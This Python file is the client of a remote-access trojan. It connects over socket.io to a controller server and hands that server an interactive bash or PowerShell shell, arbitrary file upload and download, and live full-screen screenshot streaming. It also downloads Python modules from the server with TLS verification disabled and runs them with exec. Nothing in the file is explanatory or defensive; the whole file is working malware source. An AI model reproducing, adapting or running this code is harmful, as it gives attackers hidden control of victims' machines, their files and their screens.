import subprocess
import threading
import platform
import socketio
import sys
import base64
import ssl
from urllib.request import urlopen
from PIL import Image
import importlib.util
import mss
import time
import io

def run(data):
    stop_thread = False
    def create_moduel(url):
        # Create an SSL context that doesn't verify certificates
        context = ssl._create_unverified_context()
        # Use the context when opening the URL
        with urlopen(url, context=context) as response:
            code = response.read().decode('utf-8')
    
        spec = importlib.util.spec_from_loader('temp', loader=None)
        module = importlib.util.module_from_spec(spec)
    
        # Execute the code in the module's namespace
        exec(code, module.__dict__)
    
        return module

    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    global shell

    if system == "Linux" or system == "Darwin":
        shellScript = "bash"
    elif system == 'Windows':
        shellScript = "powershell"
    else:
        shellScript = "bash"

    class InteractiveShell:

        def __init__(self):
            self.process = None
            self.running = False

        def start(self):
            self.running = True
            self.process = subprocess.Popen(
                [shellScript],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                universal_newlines=True,
            )

            # Start threads for handling output and error
            output_thread = threading.Thread(target=self.read_output, args=(self.process.stdout,))
            error_thread = threading.Thread(target=self.read_output, args=(self.process.stderr,))
            output_thread.start()
            error_thread.start()

            # Wait for both threads to finish
            output_thread.join()
            error_thread.join()

        def read_output(self, pipe):
            while self.running:
                output = pipe.readline().rstrip()
                if output:
                    sio.emit("result", output)

    # Define event handlers outside the class
    @sio.on("command")
    def command(data_new):
        if data['uuid'] == data_new['id']:
            shell.process.stdin.write(data_new['cmd'] + "\n")
            shell.process.stdin.flush()

    @sio.on('restart')
    def restart(data_new):
        global shell  # Declare shell as global to modify it
        if data_new == data['uuid']:
            if shell.process:
                shell.process.terminate()
                shell.running = False
            shell = InteractiveShell()  # Create a new InteractiveShell instance
            shell.start()  # Start the new shell process

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        print(sio.sid)
        print(data["uuid"])

    
    @sio.on('upload_file')
    def upload_file(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data_new['file_name'])
            with open(data_new['file_name'], 'wb') as f:
                decoded_data = base64.b64decode(data_new['file'])
                f.write(decoded_data)


    @sio.on("download_file")
    def download_file(data_new):
        if data['uuid'] == data_new['uuid']:
            with open(data_new['file_path'], 'rb') as f:
                file = f.read()
            file_ready = base64.b64encode(file).decode('utf-8')
            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
            print("emited")


    @sio.on("pem")
    def pem(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data['url']+data_new['url'])
            moduel = create_moduel(data['url']+data_new['url'])
            moduel.run(sio, data['uuid'])

    def take_screenshots(sio, uid, fps=5, quality=20):
        global stop_thread
        frame_interval = 1 / fps
        last_capture_time = 0

        with mss.mss() as sct:
            monitor = sct.monitors[0]  # Capture the entire screen

            while not stop_thread:
                current_time = time.time()
                if current_time - last_capture_time >= frame_interval:
                    # Capture screenshot
                    screenshot = sct.grab(monitor)
                    
                    # Convert screenshot to PIL Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    
                    # Compress to JPEG with adjustable quality
                    with io.BytesIO() as output:
                        img.save(output, format="JPEG", quality=quality)
                        jpeg_data = output.getvalue()
                    
                    # Emit the raw JPEG data instead of base64
                    sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
                    print("Sent compressed screenshot")

                    last_capture_time = current_time

                # Small sleep to prevent a tight loop
                time.sleep(0.001)


    screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
    @sio.on("screen_status")
    def screen_status(data_new):
        if data['uuid'] == data_new['uid']:
            if data_new['status'] == "start":
                stop_thread = False
                screenshot_thread.start()
            else:
                stop_thread = True
                screenshot_thread.join()


    sio.connect(data['url'])

    shell = InteractiveShell()
    shell.start()
    sio.wait()